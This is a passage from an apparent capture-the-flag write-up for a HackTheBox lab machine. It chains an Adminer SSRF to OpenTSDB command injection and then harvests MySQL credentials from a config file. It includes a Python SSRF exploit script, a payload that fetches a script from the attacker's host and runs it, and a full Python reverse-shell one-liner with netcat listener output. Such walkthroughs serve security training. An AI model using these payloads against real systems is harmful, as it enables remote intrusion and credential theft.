src="https://user-images.githubusercontent.com/9076747/166109194-e5394179-4a36-4396-a92a-c3bd88778326.png" alt="https://user-images.githubusercontent.com/9076747/166109194-e5394179-4a36-4396-a92a-c3bd88778326.png"></p><p>Once the request forwarded we can see an incoming request confirming the SSRF succeed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python redirect.py 80 http://127.0.0.1</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 12:02:24] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br></pre></td></tr></table></figure><p>As expected Adminer return the content of the main application HTML page in the error message:</p><p><img src="https://user-images.githubusercontent.com/9076747/166109316-db9ee2bd-4472-4d26-b2d6-47bdb3f94868.png" alt="https://user-images.githubusercontent.com/9076747/166109316-db9ee2bd-4472-4d26-b2d6-47bdb3f94868.png"></p><p>We can now access local services running on the server through this SSRF vulnerability. </p><p>Since it’s a bit cumbersome to use Burp intercept every time let’s write a quick Python script to exploit this vulnerability more easily:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adminer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;auth[driver]&#x27;</span>: <span class="string">&#x27;elastic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;auth[server]&#x27;</span>: <span class="string">&#x27;10.10.14.67&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s = requests.Session()</span><br><span class="line">        r = s.post(<span class="string">&quot;http://db.admirer-gallery.htb/&quot;</span>, data)</span><br><span class="line">        soup = BeautifulSoup(r.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> soup.find(<span class="string">&#x27;div&#x27;</span>, &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;error&#x27;</span>&#125;).text</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPRequestHandler</span>(<span class="params">BaseHTTPRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, redirect, *args</span>):</span></span><br><span class="line">        self.redirect = redirect</span><br><span class="line">        BaseHTTPRequestHandler.__init__(self, *args)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.send_response(<span class="number">301</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Location&#x27;</span>, self.redirect)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, port, redirect</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">*args</span>):</span></span><br><span class="line">            HTTPRequestHandler(redirect, *args)</span><br><span class="line">        httpd = HTTPServer((<span class="string">&quot;&quot;</span>, <span class="built_in">int</span>(port)), handler)</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Running redirect HTTP Server to <span class="subst">&#123;sys.argv[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    thread = Thread(target=Server, args=(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>]), daemon=<span class="literal">True</span>)</span><br><span class="line">    thread.start()</span><br><span class="line">    ssrf_result = Adminer().connect()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n[+] SSRF return:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ssrf_result)</span><br></pre></td></tr></table></figure><p>Now we can run it with the following command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 http://127.0.0.1:80</span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:80</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:12:38] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;Admirer&lt;/title&gt;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>A typical way to exploit SSRF would be to make connections to internal-only services within the box infrastructure. The issue is, we don’t know what kind of services are running there. We could brute-force to find the open ports but this will be a pain… </p><p>I decided to take a step back and while looking back at my recon phase I noticed that out of habits I didn’t use <code>sudo</code> to run <code>nmap</code>, for once not running a program as root can be a bad habits since some discovery methods used by <code>nmap</code> (UDP port scanning) rely on the root privilege to work properly. And indeed, if we restart <code>nmap</code> as root, we find a new port <code>4242</code> being marked as “filtered”. </p><blockquote><p><strong>Filtered Port:</strong> Nmap cannot determine whether the port is open because packet<br>filtering (firewall) prevents its probes from reaching the port. The filtering<br>could be from a dedicated firewall device, router rules, or host-based firewall<br>software.<br><a href="https://nmap.org/book/man.htm">https://nmap.org/book/man.htm</a>l</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nmap -p- -sV -sC admirertoo.htb</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 14:34 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> admirertoo.htb (10.129.111.234)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65530 closed tcp ports (reset)</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)</span><br><span class="line">|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)</span><br><span class="line">|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)</span><br><span class="line">80/tcp    open     http           Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">4242/tcp  filtered vrml-multi-use</span><br><span class="line">16010/tcp filtered unknown</span><br><span class="line">16030/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>Let’s see if we can exploit the SSRF vulnerability against the service running on port <code>4242</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 http://127.0.0.1:4242</span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:21:12] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=content-type content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;&lt;title&gt;OpenTSDB&lt;/title&gt;</span><br><span class="line">&lt;style&gt;&lt;!--</span><br><span class="line">body&#123;font-family:arial,sans-serif;margin-left:2em&#125;A.l:link&#123;color:<span class="comment">#6f6f6f&#125;A.u:link&#123;color:green&#125;.fwf&#123;font-family:monospace;white-space:pre-wrap&#125;//--&gt;&lt;/style&gt;&lt;script type=text/javascript language=javascript src=s/queryui.nocache.js&gt;&lt;/script&gt;&lt;/head&gt;</span></span><br><span class="line">&lt;body text=<span class="comment">#000000 bgcolor=#ffffff&gt;&lt;table border=0 cellpadding=2 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td rowspan=3 width=1% nowrap&gt;&lt;img src=s/opentsdb_header.jpg&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;font color=#507e9b&gt;&lt;b&gt;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;div id=queryuimain&gt;&lt;/div&gt;&lt;noscript&gt;You must have JavaScript enabled.&lt;/noscript&gt;&lt;iframe src=javascript:&#x27;&#x27; id=__gwt_historyFrame tabIndex=-1 style=position:absolute;width:0;height:0;border:0&gt;&lt;/iframe&gt;&lt;table width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td class=subg&gt;&lt;img alt=&quot;&quot; width=1 height=6&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>It works! It seems to be a web server. The page title refers to an <code>OpenTSDB</code> application. Never heard of it before:</p><blockquote><p>OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.<br><a href="http://opentsdb.net/">http://opentsdb.net/</a></p></blockquote><h3 id="Adminer-SSRF-→-OpenTSBD-RCE"><a href="#Adminer-SSRF-→-OpenTSBD-RCE" class="headerlink" title="Adminer SSRF → OpenTSBD RCE"></a>Adminer SSRF → OpenTSBD RCE</h3><p>After another quick Google search we stumble upon a Remote Code Execution Vulnerability in OpenTSBD:</p><blockquote><p><strong>CVE-2020-35476</strong>: A remote code execution vulnerability occurs in OpenTSDB through 2.4.0 via command injection in the yrange parameter. The yrange value is written to a gnuplot file in the /tmp directory. This file is then executed via the <a href="http://mygnuplot.sh/">mygnuplot.sh</a> shell script. (tsd/GraphHandler.java attempted to prevent command injections by blocking backticks but this is insufficient.)<br><a href="https://www.cvedetails.com/cve/CVE-2020-35476/">https://www.cvedetails.com/cve/CVE-2020-35476/</a></p></blockquote><p>Let’s see if the version running on the box is vulnerable.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 http://127.0.0.1:4242/api/version</span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242/api/version</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:27:05] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">&#123;[...]<span class="string">&quot;version&quot;</span>:<span class="string">&quot;2.4.0&quot;</span>,<span class="string">&quot;full_revision&quot;</span>:<span class="string">&quot;14ab3ef8a865816cf920aa69f2e019b7261a7847&quot;</span>,<span class="string">&quot;repo_status&quot;</span>:<span class="string">&quot;MINT&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;hobbes&quot;</span>,<span class="string">&quot;branch&quot;</span>:<span class="string">&quot;master&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;1545014415&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>Bingo! It’s vulnerable. Let’s try to reproduce the <a href="https://github.com/OpenTSDB/opentsdb/issues/2051">Proof-of-Concept</a>.</p><p>First we need to open a simple Python HTTP server - if the server get a connection from the box it means we achieved RCE:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Then we build a simple payload that will connect to our sever (<code>curl 10.10.14.67:8000</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 <span class="string">&quot;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#x27;curl+10.10.14.67%3A8000&#x27;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&quot;</span></span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(<span class="string">&#x27;curl+10.10.14.67%3A8000&#x27;</span>)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:43:13] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">&#123;<span class="string">&quot;err&quot;</span>:<span class="string">&quot;java.lang.RuntimeException: Unexpected exception\n\tat net.opentsdb.core.TSQuery.buildQueries(TSQuery.java:224) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.GraphHandler.doGraph(GraphHandler.java:172) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.GraphHandler.execute(GraphHandler.java:123) ~[tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.RpcHandler.handleHttpQuery(RpcHandler.java:282) [tsdb-2.4.0.jar:14ab3ef]\n\tat net.opentsdb.tsd.RpcHandler.messageReceived(RpcHandler.java:133) [tsdb-2.4.0.jar:14ab3ef]\n\tat org.jboss.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70) [netty-3.10.6.Fina</span></span><br></pre></td></tr></table></figure><p><code>OpenTSBD</code> returns an error message. It’s a pain to read it but we can understand that the metric <code>cpu.nice</code> we used from the vulnerability PoC is not available on this instance (<code>No such name for &#39;metrics&#39;: &#39;sys.cpu.nice’</code>). </p><p>Following the <a href="http://opentsdb.net/docs/build/html/api_http/suggest.html">documentation</a> we can find an endpoint to list available <code>metrics</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 <span class="string">&#x27;http://127.0.0.1:4242/api/suggest?type=metrics&#x27;</span></span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242/api/suggest?<span class="built_in">type</span>=metrics</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:48:46] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="built_in">return</span>:</span><br><span class="line">[<span class="string">&quot;http.stats.web.hits&quot;</span>]</span><br></pre></td></tr></table></figure><p>Perfect, let’s now replace <code>sys.cpu.nice</code> with <code>http.stats.web.hits</code> in our payload and retry:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-<span class="number">2021</span>-<span class="number">21311.</span>py <span class="number">80</span> <span class="string">&quot;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#x27;curl+10.10.14.67%3A8000&#x27;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&quot;</span></span><br><span class="line">[+] Running redirect HTTP Server to http:<span class="comment">//127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#x27;curl+10.10.14.67%3A8000&#x27;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span></span><br><span class="line"><span class="number">10.129</span><span class="number">.111</span><span class="number">.234</span> - - [<span class="number">30</span>/Apr/<span class="number">2022</span> <span class="number">16</span>:<span class="number">50</span>:<span class="number">30</span>] <span class="string">&quot;GET / HTTP/1.0&quot;</span> <span class="number">301</span> -</span><br><span class="line"></span><br><span class="line">[+] SSRF <span class="keyword">return</span>:</span><br><span class="line">&#123;<span class="string">&quot;plotted&quot;</span>:<span class="number">4</span>,<span class="string">&quot;timing&quot;</span>:<span class="number">608</span>,<span class="string">&quot;etags&quot;</span>:[[<span class="string">&quot;host&quot;</span>]],<span class="string">&quot;points&quot;</span>:<span class="number">8</span>&#125;</span><br></pre></td></tr></table></figure><p>Bingo! We receive a connection on our HTTP server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 16:50:31] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure><p>It’s time to update our payload to a reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.14.67&quot;</span>,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Let’s now open our listener and run our urlencoded payload (<code>curl 10.10.14.67:8000/hg8.py -o /tmp/hg8.py &amp;&amp; python /tmp/hg8.py</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on 0.0.0.0 8585</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python CVE-2021-21311.py 80 <span class="string">&quot;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(&#x27;curl%2010.10.14.67%3A8000%2Fhg8.py%20-o%20%2Ftmp%2Fhg82.py%3Bpython%20%2Ftmp%2Fhg82.py&#x27;)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json&quot;</span></span><br><span class="line"></span><br><span class="line">[+] Running redirect HTTP Server to http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system(<span class="string">&#x27;curl%2010.10.14.67%3A8000%2Fhg8.py%20-o%20%2Ftmp%2Fhg82.py%3Bpython%20%2Ftmp%2Fhg82.py&#x27;</span>)]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 17:12:54] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 301 -</span><br></pre></td></tr></table></figure><p>We receive a connection and our first shell on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on 0.0.0.0 8585</span><br><span class="line">Connection received on admirertoo.htb 58676</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">opentsdb@admirertoo:/$ id</span></span><br><span class="line"><span class="string">uid=1000(opentsdb) gid=1000(opentsdb) groups=1000(opentsdb)</span></span><br></pre></td></tr></table></figure><h3 id="Privilege-escalation-→-jennifer-user"><a href="#Privilege-escalation-→-jennifer-user" class="headerlink" title="Privilege escalation → jennifer user"></a>Privilege escalation → jennifer user</h3><p>Listing <code>/home/</code> and <code>/etc/passwd</code> to find the user and flag location:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/$ ls /home/</span><br><span class="line">jennifer</span><br></pre></td></tr></table></figure><p>To get a user flag we will need to find a way to pivot to <code>jennifer</code> user.</p><p>While doing the usual recon we notice that a service is running on port <code>8080</code> and probably connected to MySQL instance on port <code>3306</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/$ netstat -tulpn | grep LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.0.1:2181          :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::16010                :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::4242                 :::*                    LISTEN      554/java</span><br><span class="line">tcp6       0      0 127.0.1.1:16020         :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::16030                :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.1.1:16000         :::*                    LISTEN      -</span><br></pre></td></tr></table></figure><p>Unfortunately the port is still filtered and we can’t access it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/$ curl 127.0.0.1:8080</span><br><span class="line">curl: (7) Failed to connect to 127.0.0.1 port 8080: Connection refused</span><br></pre></td></tr></table></figure><h3 id="OpenCATS-database"><a href="#OpenCATS-database" class="headerlink" title="OpenCATS database"></a>OpenCATS database</h3><p>After the usual recon we find in the <code>/opt</code> folder an application called <code>openCATS</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/opt/opencats$ cat README.md</span><br><span class="line"><span class="comment"># OpenCATS</span></span><br><span class="line">[![Codacy Badge](https://api.codacy.com/project/badge/Grade/948d67033d624e9382a332af20339c00)](https://www.codacy.com/app/OpenCATS/OpenCATS?utm_source=github.com&amp;amp;utm_medium=referral&amp;amp;utm_content=opencats/OpenCATS&amp;amp;utm_campaign=Badge_Grade)</span><br><span class="line">[![Build Status](https://travis-ci.org/opencats/OpenCATS.png)](https://travis-ci.org/opencats/OpenCATS)</span><br><span class="line"></span><br><span class="line">OpenCATS is a Free and Open Source Candidate/Applicant Tracking System designed <span class="keyword">for</span> Recruiters to manage recruiting process from job posting, candidate application, through to candidate selection and submission.</span><br><span class="line"></span><br><span class="line">More details:</span><br><span class="line">http://www.opencats.org</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>It’s probably safe to guess this is the app running on port 8080.</p><p>Reading through the source code we can quickly retrieve the MySQL database credentials:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/opt/opencats$ head /opt/opencats/config.php</span><br><span class="line">[...]</span><br><span class="line">define(<span class="string">&#x27;DATABASE_USER&#x27;</span>, <span class="string">&#x27;cats&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_PASS&#x27;</span>, <span class="string">&#x27;adm1r3r0fc4ts&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DATABASE_NAME&#x27;</span>, <span class="string">&#x27;cats_dev&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Let’s connect to the database to see if we can find some information on <code>jennifer</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 